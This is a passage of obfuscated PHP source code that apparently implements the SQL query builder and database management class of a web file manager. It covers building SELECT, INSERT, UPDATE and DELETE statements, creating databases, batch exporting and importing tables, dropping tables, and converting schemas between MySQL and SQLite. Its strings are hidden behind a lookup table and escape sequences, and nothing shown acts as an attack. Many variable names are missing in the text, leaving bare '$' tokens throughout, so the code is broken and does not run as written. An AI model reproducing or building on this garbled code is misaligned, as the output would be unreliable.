$罚[12], $罚[31] => isset($[$罚[94]]) ? substr($[$罚[94]], 1) : $罚[12]); } else { preg_match($罚[1047], trim($Ҳ), $ؿ); $ӑ = array($罚[1022] => $ؿ[1], $罚[949] => $ؿ[2], $罚[950] => $ؿ[3], $罚[947] => $ؿ[4], $罚[948] => $ؿ[5], $罚[31] => $ؿ[6]); } $ӑ[$罚[977]] = $罚[12]; return $ӑ; } protected function debug() { $ߌ =& $_SERVER[ʯ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $ߌ[1048]; if (think_config($ߌ[1049])) { think_status($ߌ[1050]); think_trace($this->queryStr . $ߌ[1051] . think_status($ߌ[34], $ߌ[1050], 6) . $ߌ[1052], $ߌ[12], $ߌ[1053]); } } protected function parseLock($ܨ = false) { $Е =& $_SERVER[ʯ]; if (!$ܨ) { return $Е[12]; } if ($Е[979] == $this->dbType) { return $Е[1054]; } return $Е[1055]; } protected function parseSet($փ) { $ =& $_SERVER[ʯ]; foreach ($փ as $ðӃ => $) { if (is_array($) && $[349] == $[0]) { $[] = $this->parseKey($ðӃ) . $[945] . $[1]; } elseif (is_scalar($) || is_null($)) { $[] = $this->parseKey($ðӃ) . $[945] . $this->parseValue($); } } return $[1056] . implode($[60], $); } protected function bindParam($ס, $錐) { $this->bind[$_SERVER[ʯ][4] . $ס] = $錐; } protected function parseBind($ȷ) { $ȷ = array_merge($this->bind, $ȷ); $this->bind = array(); return $ȷ; } function parseKey(&$, $ = true) { if ($) { $ = $this->parseKeyCheck($); } return $; } function parseKeyCheck($) { $ =& $_SERVER[ʯ]; $ = trim($); if (!preg_match($[1057], $)) { think_exception($[1058] . $); } return $; } protected function parseValue($ϫ) { $£Ƿ =& $_SERVER[ʯ]; if (is_string($ϫ)) { $ϫ = $£Ƿ[1018] . $this->escapeString($ϫ) . $£Ƿ[1018]; } elseif (isset($ϫ[0]) && is_string($ϫ[0]) && strtolower($ϫ[0]) == $£Ƿ[349]) { $ϫ = $this->escapeString($ϫ[1]); } elseif (is_array($ϫ)) { $ϫ = array_map(array($this, $£Ƿ[1019]), $ϫ); } elseif (is_bool($ϫ)) { $ϫ = $ϫ ? $£Ƿ[98] : $£Ƿ[221]; } elseif (is_null($ϫ)) { $ϫ = $£Ƿ[113]; } return $ϫ; } protected function parseField($ˢ) { $ =& $_SERVER[ʯ]; if (is_string($ˢ) && strpos($ˢ, $[60])) { $ˢ = explode($[60], $ˢ); } if (is_array($ˢ)) { $ = array(); foreach ($ˢ as $ => $͂) { if (!is_numeric($)) { $[] = $this->parseKey($, !1) . $[1059] . $this->parseKey($͂); } else { $[] = $this->parseKey($͂); } } $諡 = implode($[60], $); } elseif (is_string($ˢ) && !empty($ˢ)) { $諡 = $ˢ; } else { $諡 = $[212]; } return $諡; } protected function parseTable($) { $ =& $_SERVER[ʯ]; if (is_array($)) { $ = array(); foreach ($ as $ؼ => $) { if (!is_numeric($ؼ)) { $[] = $this->parseKey($ؼ) . $[63] . $this->parseKey($); } else { $[] = $this->parseKey($ؼ); } } $ = $; } elseif (is_string($)) { if (strstr($, $[63])) { return $; } $ = explode($[60], $); array_walk($, array($this, $[967])); } return $[961] . trim(implode($[1060], $), $[437]) . $[961]; } protected function parseWhere($) { $ϔ =& $_SERVER[ʯ]; $ = $ϔ[12]; if (is_string($)) { $ = $; } else { $Ǖ = isset($[$ϔ[1061]]) ? strtoupper($[$ϔ[1061]]) : $ϔ[12]; if (in_array($Ǖ, array($ϔ[1062], $ϔ[1063], $ϔ[1064]))) { $Ǖ = $ϔ[63] . $Ǖ . $ϔ[63]; unset($[$ϔ[1061]]); } else { $Ǖ = $ϔ[1065]; } foreach ($ as $Ĺ => $ڙ) { $ .= $ϔ[329]; if (is_numeric($Ĺ)) { $Ĺ = $ϔ[1066]; } if (0 === strpos($Ĺ, $ϔ[11])) { $ .= $this->parseThinkWhere($Ĺ, $ڙ); } else { if (!preg_match($ϔ[1067], trim($Ĺ))) { think_exception(think_lang($ϔ[1068]) . $ϔ[4] . $Ĺ); } $ = is_array($ڙ) && isset($ڙ[$ϔ[1069]]); $Ĺ = trim($Ĺ); if (strpos($Ĺ, $ϔ[335])) { $۠ = explode($ϔ[335], $Ĺ); $Ɠ͌ = array(); foreach ($۠ as $ => $Ϟ) { $ = $ ? $ڙ[$] : $ڙ; $Ɠ͌[] = $ϔ[312] . $this->parseWhereItem($this->parseKey($Ϟ), $) . $ϔ[966]; } $ .= implode($ϔ[1070], $Ɠ͌); } elseif (strpos($Ĺ, $ϔ[336])) { $۠ = explode($ϔ[336], $Ĺ); $Ɠ͌ = array(); foreach ($۠ as $ => $Ϟ) { $ = $ ? $ڙ[$] : $ڙ; $Ɠ͌[] = $ϔ[312] . $this->parseWhereItem($this->parseKey($Ϟ), $) . $ϔ[966]; } $ .= implode($ϔ[1065], $Ɠ͌); } else { $ .= $this->parseWhereItem($this->parseKey($Ĺ), $ڙ); } } $ .= $ϔ[330] . $Ǖ; } $ = substr($, 0, -strlen($Ǖ)); } return empty($) ? $ϔ[12] : $ϔ[1071] . $; } protected function parseWhereItem($ᑸ, $颕) { $ =& $_SERVER[ʯ]; $Ԋ = $[12]; if (is_array($颕)) { if (is_string($颕[0])) { $ण = strtolower($颕[0]); if (in_array($颕[0], array($[945], $[1072], $[1073], $[1074], $[1075], $[1076]))) { $Ԋ .= $ᑸ . $[63] . $颕[0] . $[63] . $this->parseValue($颕[1]); } elseif (preg_match($[1077], $颕[0])) { $Ԋ .= $ᑸ . $[63] . $this->exp[$ण] . $[63] . $this->parseValue($颕[1]); } elseif (preg_match($[1078], $颕[0])) { if (is_array($颕[1])) { $ = isset($颕[2]) ? strtoupper($颕[2]) : $[1063]; if (in_array($, array($[1062], $[1063], $[1064]))) { $ = array(); foreach ($颕[1] as $ȭ) { $[] = $ᑸ . $[63] . $this->exp[$ण] . $[63] . $this->parseValue($ȭ); } $Ԋ .= $[312] . implode($[63] . $ . $[63], $) . $[966]; } } else { $Ԋ .= $ᑸ . $[63] . $this->exp[$ण] . $[63] . $this->parseValue($颕[1]); } } elseif ($[349] == $ण) { $Ԋ .= $[964] . $ᑸ . $[63] . $颕[1] . $[1079]; } elseif (preg_match($[1080], $颕[0])) { $Ԋ .= $颕[0]; } elseif (preg_match($[1081], $颕[0])) { if (isset($颕[2]) && $[349] == $颕[2]) { $Ԋ .= $ᑸ . $[63] . $this->exp[$ण] . $[63] . $颕[1]; } else { if (is_string($颕[1])) { $颕[1] = explode($[60], $颕[1]); } $ = implode($[60], $this->parseValue($颕[1])); $Ԋ .= $ᑸ . $[63] . $this->exp[$ण] . $[964] . $ . $[966]; } } elseif (preg_match($[1082], $颕[0])) { $İծ = is_string($颕[1]) ? explode($[60], $颕[1]) : $颕[1]; $Ԋ .= $[964] . $ᑸ . $[63] . $this->exp[$ण] . $[63] . $this->parseValue($İծ[0]) . $[1065] . $this->parseValue($İծ[1]) . $[330]; } else { think_exception(think_lang($[1068]) . $[4] . $颕[0]); } } else { $ڞ = count($颕); $ = $[12]; if (is_string($颕[$ڞ - 1])) { $ = isset($颕[$ڞ - 1]) ? strtoupper($颕[$ڞ - 1]) : $[12]; if (in_array($, array($[1062], $[1063], $[1064]))) { $ڞ = $ڞ - 1; } } else { $ = $[1062]; } for ($ = 0; $ < $ڞ; $++) { $İծ = is_array($颕[$]) ? $颕[$][1] : $颕[$]; if ($[349] == strtolower($颕[$][0])) { $Ԋ .= $[312] . $ᑸ . $[63] . $İծ . $[1079] . $ . $[63]; } else { $ = is_array($颕[$]) ? $this->exp[strtolower($颕[$][0])] : $[945]; if (!$ && is_array($颕[$]) && in_array($颕[$][0], array($[945], $[1072], $[1073], $[1074], $[1075], $[1076]))) { $ = $颕[$][0]; } $Ԋ .= $[312] . $ᑸ . $[63] . $ . $[63] . $this->parseValue($İծ) . $[1079] . $ . $[63]; } } $Ԋ = substr($Ԋ, 0, -4); } } else { $Ԋ .= $ᑸ . $[1083] . $this->parseValue($颕); } return $Ԋ; } protected function parseThinkWhere($Ȫ, $б) { $Ƌڟ =& $_SERVER[ʯ]; $ = $Ƌڟ[12]; switch ($Ȫ) { case $Ƌڟ[404]: $ = $б; break; case $Ƌڟ[1066]: $ = is_string($б) ? $б : substr($this->parseWhere($б), 6); break; case $Ƌڟ[1084]: parse_str($б, $Ɯ卂); if (isset($Ɯ卂[$Ƌڟ[1061]])) { $޵ = $Ƌڟ[63] . strtoupper($Ɯ卂[$Ƌڟ[1061]]) . $Ƌڟ[63]; unset($Ɯ卂[$Ƌڟ[1061]]); } else { $޵ = $Ƌڟ[1065]; } $Ы = array(); foreach ($Ɯ卂 as $ => $ԍ˕) { $Ы[] = $this->parseKey($) . $Ƌڟ[1083] . $this->parseValue($ԍ˕); } $ = implode($޵, $Ы); break; } return $; } protected function parseLimit($⍱) { $ =& $_SERVER[ʯ]; return !empty($⍱) ? $[61] . $⍱ . $[63] : $[12]; } protected function parseJoin($) { $Ц =& $_SERVER[ʯ]; $Ž = $Ц[12]; if (!empty($)) { if (is_array($)) { foreach ($ as $¯ => $㢬) { if (!1 !== stripos($㢬, $Ц[1085])) { $Ž .= $Ц[63] . $㢬; } else { $Ž .= $Ц[1086] . $㢬; } } } else { $Ž .= $Ц[1086] . $; } } $Ž = preg_replace($Ц[1087], think_config($Ц[991]) . $Ц[1088], $Ž); return $Ž; } protected function parseOrder($י) { $ˌ =& $_SERVER[ʯ]; if (is_array($י)) { $֝ = array(); foreach ($י as $ݣ => $ԶЎ) { if (is_numeric($ݣ)) { $֝[] = $this->parseKey($ԶЎ); } else { $ԶЎ = in_array(strtoupper(trim($ԶЎ)), array($ˌ[1089], $ˌ[1090])) ? $ˌ[63] . $ԶЎ : $ˌ[12]; if (preg_match($ˌ[1091], $ݣ)) { $֝[] = $this->parseKey($ݣ) . $ԶЎ; } else { think_exception($ˌ[1092] . $ݣ); } } } $י = implode($ˌ[60], $֝); } return !empty($י) ? $ˌ[1093] . $י : $ˌ[12]; } protected function parseGroup($) { $ƶֱ =& $_SERVER[ʯ]; return !empty($) ? $ƶֱ[1094] . $ : $ƶֱ[12]; } protected function parseHaving($) { $ =& $_SERVER[ʯ]; return !empty($) ? $[1095] . $ : $[12]; } protected function parseComment($޾) { $🺃 =& $_SERVER[ʯ]; return !empty($޾) ? $🺃[1096] . $޾ . $🺃[1097] : $🺃[12]; } protected function parseDistinct($ɀӐ) { $շ =& $_SERVER[ʯ]; return !empty($ɀӐ) ? $շ[1098] : $շ[12]; } protected function parseUnion($͑) { $ʍ =& $_SERVER[ʯ]; if (empty($͑)) { return $ʍ[12]; } if (isset($͑[$ʍ[400]])) { $振 = $ʍ[1099]; unset($͑[$ʍ[400]]); } else { $振 = $ʍ[1100]; } foreach ($͑ as $) { $貄[] = $振 . (is_array($) ? $this->buildSelectSql($) : $); } return implode($ʍ[63], $貄); } public function insert($އ, $֦ɍ = array(), $ڞ = false) { $ =& $_SERVER[ʯ]; $̆ = $ = array(); $this->model = $֦ɍ[$[333]]; foreach ($އ as $͍߱ => $ʄ) { if (is_array($ʄ) && $[349] == $ʄ[0]) { $[] = $this->parseKey($͍߱); $̆[] = $ʄ[1]; } elseif (is_scalar($ʄ) || is_null($ʄ)) { $[] = $this->parseKey($͍߱); $̆[] = $this->parseValue($ʄ); } } $ = ($ڞ ? $[968] : $[969]) . $[970] . $this->parseTable($֦ɍ[$[331]]) . $[964] . implode($[60], $) . $[965] . implode($[60], $̆) . $[966]; $ .= $this->parseLock(isset($֦ɍ[$[904]]) ? $֦ɍ[$[904]] : !1); $ .= $this->parseComment(!empty($֦ɍ[$[406]]) ? $֦ɍ[$[406]] : $[12]); return $this->execute($, $this->parseBind(!empty($֦ɍ[$[337]]) ? $֦ɍ[$[337]] : array())); } public function selectInsert($㒄, $, $֘ = array()) { $ =& $_SERVER[ʯ]; $this->model = $֘[$[333]]; if (is_string($㒄)) { $㒄 = explode($[60], $㒄); } array_walk($㒄, array($this, $[967])); $ԗ = $[1101] . $this->parseTable($) . $[964] . implode($[60], $㒄) . $[1079]; $ԗ .= $this->buildSelectSql($֘); return $this->execute($ԗ, $this->parseBind(!empty($֘[$[337]]) ? $֘[$[337]] : array())); } public function update($֙, $۞) { $ͪї =& $_SERVER[ʯ]; $this->model = $۞[$ͪї[333]]; $ľ = $ͪї[1102] . $this->parseTable($۞[$ͪї[331]]) . $this->parseSet($֙) . $this->parseWhere(!empty($۞[$ͪї[327]]) ? $۞[$ͪї[327]] : $ͪї[12]) . $this->parseOrder(!empty($۞[$ͪї[417]]) ? $۞[$ͪї[417]] : $ͪї[12]) . $this->parseLimit(!empty($۞[$ͪї[344]]) ? $۞[$ͪї[344]] : $ͪї[12]) . $this->parseLock(isset($۞[$ͪї[904]]) ? $۞[$ͪї[904]] : !1) . $this->parseComment(!empty($۞[$ͪї[406]]) ? $۞[$ͪї[406]] : $ͪї[12]); return $this->execute($ľ, $this->parseBind(!empty($۞[$ͪї[337]]) ? $۞[$ͪї[337]] : array())); } public function delete($ = array()) { $ =& $_SERVER[ʯ]; $this->model = $[$[333]]; $ = $[1103] . $this->parseTable($[$[331]]) . $this->parseWhere(!empty($[$[327]]) ? $[$[327]] : $[12]) . $this->parseOrder(!empty($[$[417]]) ? $[$[417]] : $[12]) . $this->parseLimit(!empty($[$[344]]) ? $[$[344]] : $[12]) . $this->parseLock(isset($[$[904]]) ? $[$[904]] : !1) . $this->parseComment(!empty($[$[406]]) ? $[$[406]] : $[12]); return $this->execute($, $this->parseBind(!empty($[$[337]]) ? $[$[337]] : array())); } public function select($֖ = array()) { $ =& $_SERVER[ʯ]; $this->model = $֖[$[333]]; $ɞ = $this->buildSelectSql($֖); $ = isset($֖[$[401]]) ? $֖[$[401]] : !1; if ($) { $観 = is_string($[$[104]]) ? $[$[104]] : $[1104] . md5($ɞ); $ = think_cache($観, $[12], $); if (!1 !== $) { return $; } } $찧 = $this->query($ɞ, $this->parseBind(!empty($֖[$[337]]) ? $֖[$[337]] : array())); if ($ && !1 !== $찧) { think_cache($観, $찧, $); } return $찧; } public function buildSelectSql($č = array()) { $٩  =& $_SERVER[ʯ]; if (isset($č[$٩ [405]])) { if (strpos($č[$٩ [405]], $٩ [60])) { list($ĝ, $) = explode($٩ [60], $č[$٩ [405]]); } else { $ĝ = $č[$٩ [405]]; } $ĝ = $ĝ ? $ĝ : 1; $ = isset($) ? $ : (is_numeric($č[$٩ [344]]) ? $č[$٩ [344]] : 20); $ס = $ * ((int) $ĝ - 1); $č[$٩ [344]] = $ס . $٩ [60] . $; } if (think_config($٩ [1105])) { $ݝ¥ = $٩ [1106] . md5(serialize($č)); $Ą = think_cache($ݝ¥); if ($Ą) { return $Ą; } } $펰 = $this->parseSql($this->selectSql, $č); $펰 .= $this->parseLock(isset($č[$٩ [904]]) ? $č[$٩ [904]] : !1); if (isset($ݝ¥)) { think_cache($ݝ¥, $펰); } return $펰; } public function parseSql($һ, $ = array()) { $ґ =& $_SERVER[ʯ]; $һ = str_replace(array($ґ[1107], $ґ[1108], $ґ[1109], $ґ[1110], $ґ[1111], $ґ[1112], $ґ[1113], $ґ[1114], $ґ[1115], $ґ[1116], $ґ[1117]), array($this->parseTable("{$[$ґ[331]]}"), $this->parseDistinct(isset($[$ґ[1118]]) ? $[$ґ[1118]] : !1), $this->parseField(!empty($[$ґ[325]]) ? $[$ґ[325]] : $ґ[212]), $this->parseJoin(!empty($[$ґ[334]]) ? $[$ґ[334]] : $ґ[12]), $this->parseWhere(!empty($[$ґ[327]]) ? $[$ґ[327]] : $ґ[12]), $this->parseGroup(!empty($[$ґ[555]]) ? $[$ґ[555]] : $ґ[12]), $this->parseHaving(!empty($[$ґ[1119]]) ? $[$ґ[1119]] : $ґ[12]), $this->parseOrder(!empty($[$ґ[417]]) ? $[$ґ[417]] : $ґ[12]), $this->parseLimit(!empty($[$ґ[344]]) ? $[$ґ[344]] : $ґ[12]), $this->parseUnion(!empty($[$ґ[399]]) ? $[$ґ[399]] : $ґ[12]), $this->parseComment(!empty($[$ґ[406]]) ? $[$ґ[406]] : $ґ[12])), $һ); return $һ; } public function getLastSql($ = '') { return $ ? $this->modelSql[$] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($ܭ) { return addslashes($ܭ); } public function setModel($) { $this->model = $; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($훉 = array()) { $ٷ =& $_SERVER[ʯ]; if (empty($훉)) { $훉 = $GLOBALS[$ٷ[6]][$ٷ[31]]; } $this->database = $훉; } public function model($ = '') { return new ModelBase($, $_SERVER[ʯ][12], $this->database); } public function db($ = false) { $ی =& $_SERVER[ʯ]; $鎢 = array_change_key_case($this->database); if ($this->dbType() == $ی[23] || !$) { return $this->model()->db(); } $ = $鎢[$ی[1033]]; $鎢[$ی[1033]] = $ی[12]; if ($鎢[$ی[1028]] == $ی[1025]) { $ݩŰ = $鎢[$ی[1034]]; $鎢[$ی[1034]] = substr($ݩŰ, 0, strrpos($ݩŰ, $ی[1120])); } $this->database = $鎢; $Ԇ = $this->model()->db(); try { $ۮ = $Ԇ->execute("\163\x68\x6f\167\40\x64\141\x74\141\142\x61\x73\145\x73\40\154\x69\153\145\x20\x27{$}\x27"); } catch (Exception $ꪽ) { } if (!$ۮ) { $Ԇ->execute("\x63\x72\145\x61\x74\x65\40\x64\x61\164\x61\x62\x61\x73\x65\40\x60{$}\140"); } $鎢[$ی[1033]] = $; if ($鎢[$ی[1028]] == $ی[1025]) { $鎢[$ی[1034]] .= $ی[1120] . $; } $this->database = $鎢; $Ԇ->execute("\165\163\x65\x20\140{$}\x60"); return $Ԇ; } public function createTable($Ѡ, &$ⷭ) { $悉 =& $_SERVER[ʯ]; if (!IO::exist($Ѡ)) { ActionCall($悉[1121], !0, 0); show_json(LNG($悉[1122]), !1); } $ = $this->model()->db(); $ǘ = sqlSplit(IO::getContent($Ѡ)); foreach ($ǘ as $䠨) { $큾 = stripos($䠨, $悉[1123]) === 0; if ($큾) { $ⷭ->task[$悉[846]] += 1; } $->execute($䠨); if ($큾) { preg_match($悉[1124], $䠨, $Ǯ); $ⷭ->task[$悉[1125]] = $Ǯ[1]; $ⷭ->update(1); } } } public function insertTable($, &$ب) { $ =& $_SERVER[ʯ]; $ۦ = $this->model()->db(); $ӣ = $ЏȦ ? array($ЏȦ) : $ۦ->getTables(); foreach ($ as $) { $ЏȦ = basename($, $[848]); if (!in_array($ЏȦ, $ӣ)) { continue; } $ب->task[$[1125]] = $ЏȦ; if (get_filesize($) == 0) { continue; } $ = $this->sqlToDb($, $ب); if (!$) { ActionCall($[1121], !0, 0); show_json(LNG($[1126]) . "\133{$ЏȦ}\135", !1); } } } public function sqlFromDb($, $, &$Ĥ, $Ǒ = '') { if ($Ĥ) { $Ĥ->task[$_SERVER[ʯ][1125]] = $; } $ = $this->model($); $뇯 = 0; $ȓ = 0; $ܝ = 10000; $ = fopen($, $_SERVER[ʯ][1127]); $ = $->getPk(); $Ш = $->getDbFields(); $ڲ = $_SERVER[ʯ][12]; if ($GLOBALS[$_SERVER[ʯ][847]] && in_array($, array($_SERVER[ʯ][1128], $_SERVER[ʯ][1129]))) { $ڲ = $; } do { $ = array($ => array($_SERVER[ʯ][1075], $ȓ)); $ = $->where($)->field($Ш)->order($ . $_SERVER[ʯ][1130])->limit($ܝ)->select(); $ = !empty($) ? $ : array(); if (!($֭ = count($))) { break; } $ԅ = end($); $ȓ = $ԅ[$]; $ = array(); foreach ($ as $܌) { if ($ڲ) { if ($ == $_SERVER[ʯ][1128]) { if ($܌[$_SERVER[ʯ][43]] == $_SERVER[ʯ][1131]) { $ﴼە = json_decode($܌[$_SERVER[ʯ][426]], !0); if ($ﴼە[$_SERVER[ʯ][42]] == $GLOBALS[$_SERVER[ʯ][847]] && $ﴼە[$_SERVER[ʯ][810]] != 1) { continue; } } } else { if ($܌[$_SERVER[ʯ][43]] == $_SERVER[ʯ][1132] && $܌[$_SERVER[ʯ][104]] == $_SERVER[ʯ][839]) { continue; } } } if ($Ǒ) { $܌[$_SERVER[ʯ][94]] = "\x7b\x69\157\x3a{$Ǒ}\x7d" . substr($܌[$_SERVER[ʯ][94]], strlen("\173\151\x6f\x3a{$܌[$_SERVER[ʯ][877]]}\175")); $܌[$_SERVER[ʯ][877]] = $Ǒ; } $[] = $_SERVER[ʯ][1133] . $this->sqlEncode($܌) . $_SERVER[ʯ][1134]; } $ = "\111\116\123\x45\122\124\x20\111\x4e\124\117\40\x60{$}\140\x20\x28\140" . implode($_SERVER[ʯ][1135], $Ш) . $_SERVER[ʯ][1136]; fwrite($, $ . implode($_SERVER[ʯ][1137], $) . $_SERVER[ʯ][81] . PHP_EOL); $뇯 += $֭; if ($Ĥ) { $Ĥ->update($֭); } } while ($ܝ == $֭); fclose($); return $뇯; } public function sqlToDb($, &$Ӎ) { $͟ =& $_SERVER[ʯ]; $À = $this->model()->db(); $ = @fopen($, $͟[1138]); if (!$) { return !1; } $ = 0; $ = $͟[12]; $֘ = array(); $ = $this->dbType(); $ = $ == $͟[23] ? 500 : 2000; $釨 = basename($, $͟[848]); $䱊 = 0; $踢 = 4194304 - 104858; $ﾹ = 1000000 - 104858; while (!feof($)) { $Ѷ = trim(fgets($)); if (!$Ѷ) { continue; } $ʄ = $this->sqlDecode($Ѷ, $, $釨); if (stripos($ʄ, $͟[407]) === 0) { if (!$) { $ = $ʄ . $͟[63]; } continue; } if ($Ӎ) { $Ӎ->task[$͟[846]] += 1; } $++; $֘[] = rtrim(rtrim(trim($ʄ), $͟[60]), $͟[81]); $ź = null; $ѐ = strlen($ʄ); $䱊 += $ѐ; if ($䱊 >= ($ == 500 ? $ﾹ : $踢)) { $ź = array_pop($֘); if ($ > 1) { $--; } } if ($ >= $ || $ź) { $ʄ = $ . implode($͟[60], $֘); if (!$À->execute($ʄ)) { return !1; } if ($Ӎ) { $Ӎ->update($); } $֘ = array(); $ = 0; $䱊 = 0; if ($ź) { $֘ = array($ź); $ = 1; $䱊 = $ѐ; } } } fclose($); if (!empty($֘)) { $ʄ = $ . implode($͟[60], $֘); if (!$À->execute($ʄ)) { return !1; } if ($Ӎ) { $Ӎ->update($); } } return !0; } public function dropTable($ = null) { $ = $this->model()->db(); $ = $ ? array($) : $->getTables(); if (!$) { return; } foreach ($ as $) { if ($) { $ = strtolower($); } else { continue; } $->execute("\x64\162\157\x70\x20\164\141\x62\x6c\x65\x20\x69\146\x20\x65\x78\x69\163\x74\x73\x20\140{$}\x60"); } } private function sqlEncode($) { $ =& $_SERVER[ʯ]; $ܓ = array(); foreach ($ as $Ң) { if (is_array($Ң)) { $Ң = json_encode_force($Ң); } $Ң = addslashes($Ң); $Ң = str_replace(array($[1139], $[18]), array($[1140], $[1141]), $Ң); $ܓ[] = str_replace($[68], $[1142], $Ң); } return $[68] . implode($[1143], $ܓ) . $[68]; } private function sqlDecode($͇, $, $ٌ = '') { $Ƨѣ =& $_SERVER[ʯ]; $͇ = str_replace(array($Ƨѣ[1140], $Ƨѣ[1141]), array($Ƨѣ[1139], $Ƨѣ[18]), $͇); if ($ == $Ƨѣ[23]) { return $ٌ != $Ƨѣ[1144] ? stripslashes($͇) : $͇; } if ($ٌ == $Ƨѣ[1144]) { $͇ = str_replace($Ƨѣ[1145], $Ƨѣ[128], stripslashes($͇)); } return $͇; } public function getSqlFile($ = '') { $ =& $_SERVER[ʯ]; $ν = $this->dbType(!0); $ֲ = CONTROLLER_DIR . "\151\x6e\163\x74\141\x6c\x6c\x2f\x64\x61\164\x61\57{$ν}\56\163\161\154"; $ = file_get_contents($ֲ); $ߒ = $[1146] . ($ν == $[864] ? $[1147] : $[1148]) . $[1149]; preg_match_all($ߒ, $, $); $㮮 = $[1]; $ޗ = $this->model()->db(); $ = $ޗ->getTables(); $ = TEMP_FILES . $[1150] . date($[263]) . $[8]; del_dir($); mk_dir($); $ = $ . $[1151]; $얲 = $ . $[1152]; $ũ = $ν == $[23] ? $[864] : $[23]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\x74\141\154\154\x2f\x64\x61\x74\x61\x2f{$ũ}\x2e\163\161\x6c", $); @touch($ . $ν . $[848]); $̫ = fopen($, $[1127]); $ث = fopen($얲, $[1127]); if ($ν == $[23]) { $ = array_diff($, array($[844], $[845])); $񰜍 = array($[1153], $[1154], $[1155]); fwrite($ث, implode(PHP_EOL, $񰜍) . PHP_EOL . PHP_EOL); foreach ($ as $н) { $֍ = $this->sqlFromSqlite($н); if (!$֍[$[23]]) { continue; } fwrite($ث, $֍[$[23]] . PHP_EOL . PHP_EOL); if (!in_array($н, $㮮)) { fwrite($̫, $֍[$[864]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ as $н) { $֍ = $this->sqlFromMysql($н); if (!$֍[$[864]]) { continue; } fwrite($̫, $֍[$[864]] . PHP_EOL . PHP_EOL); if (!in_array($н, $㮮)) { fwrite($ث, $֍[$[23]] . PHP_EOL . PHP_EOL); } } } fclose($̫); fclose($ث); $ = array($[864] => $, $[23] => $얲); return $ ? $[$] : $; } public function dbType($֝浡 = false) { $ =& $_SERVER[ʯ]; $β = $֝浡 ? $GLOBALS[$[6]][$[31]] : $this->database; $β = array_change_key_case($β); $Ղ = $β[$[1028]]; if ($Ղ == $[1025]) { $ = explode($[4], $β[$[1034]]); $Ղ = $[0]; } $ = array($[1156] => $[23], $[973] => $[864]); if (isset($[$Ղ])) { $Ղ = $[$Ղ]; } return $Ղ; } public function sqlFromMysql($̺, $ہ = '') { $䠼 =& $_SERVER[ʯ]; $ = $this->model()->db(); $۸ = $->query($䠼[1157] . $̺ . $䠼[437]); if (!$۸ || !$۸[0]) { return !1; } $ = _get($۸[0], $䠼[1158], $䠼[12]); if (!$) { return !1; } $ΐ = "\104\122\117\120\x20\124\101\x42\114\x45\40\111\106\40\x45\130\x49\123\124\123\40\x60{$̺}\x60\x3b" . PHP_EOL . $ . $䠼[81]; if ($ہ && $ہ == $䠼[864]) { return $ΐ; } $ٔ۠ = array_change_key_case($GLOBALS[$䠼[6]][$䠼[31]]); $ = $ٔ۠[$䠼[1033]]; $׶߱ = $䠼[1159] . $ . $䠼[1160] . $̺ . $䠼[68]; $߇ѧ = $䠼[1161] . $̺ . $䠼[961]; $ = $->query($׶߱); if (empty($)) { $ = array($䠼[864] => $䠼[12], $䠼[23] => $䠼[12]); return $ہ ? $[$ہ] : $; } $˒ = $->query($߇ѧ); $䝫 = $䠼[12]; $ܾ = array(); foreach ($˒ as $۝) { if (!$䝫 && $۝[$䠼[1162]] == $䠼[1163]) { $䝫 = $۝[$䠼[1164]]; } if (isset($ܾ[$۝[$䠼[1162]]])) { $ܾ[$۝[$䠼[1162]]][$䠼[1165]][] = $۝[$䠼[1164]]; continue; } $ܾ[$۝[$䠼[1162]]] = array($䠼[1166] => $۝[$䠼[1162]], $䠼[1165] => array($۝[$䠼[1164]]), $䠼[1167] => $۝[$䠼[1168]] == $䠼[98] ? 0 : 1); } $ = array(); foreach ($ܾ as $۝) { $ = $۝[$䠼[1166]] == $䠼[1163]; $ = array($䠼[1169], $۝[$䠼[1167]] == $䠼[98] && !$ ? $䠼[1170] : $䠼[12], $䠼[1171], $䠼[1172] . $̺ . $䠼[11] . ($ ? $䠼[1173] : $۝[$䠼[1166]]) . $䠼[128], $䠼[1174], $䠼[128] . $̺ . $䠼[128], $䠼[1175] . implode($䠼[1176], $۝[$䠼[1165]]) . $䠼[1177]); $[] = implode($䠼[63], $) . $䠼[81]; } $垯 = array(); $ = array($䠼[1178] => $䠼[1179], $䠼[1179] => $䠼[1179], $䠼[340] => $䠼[367], $䠼[339] => $䠼[367]); foreach ($ as $۝) { $ = array($䠼[128] . $۝[$䠼[1180]] . $䠼[128], isset($[$۝[$䠼[1181]]]) ? $[$۝[$䠼[1181]]] : $۝[$䠼[1182]], $۝[$䠼[1183]] == $䠼[959] ? $䠼[1184] : $䠼[1185], $۝[$䠼[1180]] == $䝫 ? $䠼[1186] : $䠼[12], $۝[$䠼[1010]] ? strtoupper(str_replace($䠼[11], $䠼[12], $۝[$䠼[1010]])) : $䠼[12]); $垯[] = trim(implode($䠼[63], $)); } $ = array($䠼[1187] . $̺ . $䠼[1188], $䠼[1189] . $̺ . $䠼[1190], implode($䠼[60] . PHP_EOL, $垯), $䠼[1007]); $䊳 = implode(PHP_EOL, array_merge($, $)); if ($ہ && $ہ == $䠼[23]) { return $䊳; } $ = array($䠼[864] => $ΐ, $䠼[23] => $䊳); return $ہ ? $[$ہ] : $; } public function sqlFromSqlite($̎, $ܱ = '') { $ =& $_SERVER[ʯ]; $멛 = $this->model()->db(); $Ǆ = "\120\122\x41\x47\115\101\x20\x54\x41\x42\x4c\105\x5f\111\116\x46\x4f\40\x28\47{$̎}\47\51"; $ = "\x53\105\x4c\x45\x43\124\40\x2a\x20\x46\122\x4f\115\40\163\161\x6c\151\x74\145\x5f\x6d\141\163\x74\145\162\x20\127\110\105\122\105\x20\164\x62\154\137\x6e\x61\x6d\x65\40\75\40\x27{$̎}\x27"; $ = $멛->query($Ǆ); if (empty($)) { $޼ = array($[864] => $[12], $[23] => $[12]); return $ܱ ? $޼[$ܱ] : $޼; } $Йԫ = $멛->query($); $̤۵ = $ŀ = array(); foreach ($Йԫ as $) { if ($[$[43]] == $[331]) { $̤۵[] = $[$[1191]]; } else { $ŀ[$[$[42]]] = $[$[1191]]; } } $؋ = array_merge(array($[1187] . $̎ . $[128]), $̤۵, array_values($ŀ)); $؋ = implode($[81] . PHP_EOL, $؋) . $[81]; if ($ܱ && $ܱ == $[23]) { return $؋; } $ݍނ = array(); $´ = array($[1179] => $[1192], $[367] => 